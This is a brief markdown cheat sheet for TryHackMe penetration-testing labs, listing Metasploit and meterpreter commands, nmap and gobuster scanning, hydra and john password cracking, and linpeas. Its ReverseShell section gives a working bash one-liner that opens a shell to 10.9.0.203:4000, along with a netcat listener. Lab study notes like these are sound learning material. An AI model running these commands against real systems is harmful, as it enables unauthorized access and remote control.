# Overview

## Table of Contents
* [Setup](#setup)
* [Tools](#tools)
   1. [Notes](#notes)
   2. [Scouting](#scouting)
   3. [BruteForce](#bruteforcing)
   4. [WordLists](#wordlists)
   5. [TargetInteraction](#targetinteraction)
   6. [ReverseShell](#reverseshell)

## Setup
1. Setup Kali Linux VM
2. Download OpenVPN Config file from TryHackMe
3. `sudo openvpn <name-of-file>`
4. `ping <target-machine-ip>`

## Tools

### Notes
* cherry tree
* vim/markdown

### Scouting

* Add Target Domain to /etc/hosts so you can reach it
   ```bash
   sudo vim /etc/hosts
   ```

* Metasploit (Exploits)
   ```sh
   # search for exploits / cve's regarding given tool
   search <tool-name>
   ```
   ```sh
   # use exploit
   use <exploit-name>
   ```
   ```sh
   # set listening host ip
   LHOST set <own-ip>
   ```
   ```sh
   # set target ip
   RHOSTS set <target-machine-ip>
   ```
   * meterpreter (Metasploit exploit shell)
      ```sh
      # get user info
      getuid
      ```
      ```sh
      # get system info
      sysinfo
      ```
      ```sh
      # move meterpreter (exploit) session into background
      background
      ```
      ```sh
      # switch to different meterpreter (exploit) sessions
      sessions
      ```
      ```sh
      # get privileges
      getprivs
      ```
      ```sh
      # switch to different process on target system
      migrate -N <process-name>
      ```

* nmap (Ports / Urls)
   ```sh
   nmap [options] <target-machine-ip>

   -sV # Probe open ports to determine service/version info
   ```

* gobuster (Urls)
   ```sh
   # search for endpoints at given ip via word-list
   gobuster dir -u <target-machine-ip> -w <word-list>
   ```

* ffuf
    * can search for subdomains

### SQL Injection

* Check Return Codes (Network Tab) if you can produce SQL / Server Internal Errors

### BruteForcing
* hydra
    * can bruteforce urls with requests
* john
    * can identify hashes, brute force files (like shadow)
* ssh2john
    * can convert ssh keys so that john can read them

### Wordlists
* /usr/share/wordlists
* /usr/share/seclists

### TargetInteraction
* ssh
* scp
* linpeas

### ReverseShell
* netcat
   ```sh
   nc -lnvp <listening_port> # host
   bash -c 'bash -i >& /dev/tcp/10.9.0.203/4000 0>&1 2>&1' # client
   ```

* simple http webserver
   ```sh
   python3 -m http.server <listening_port>
   ```
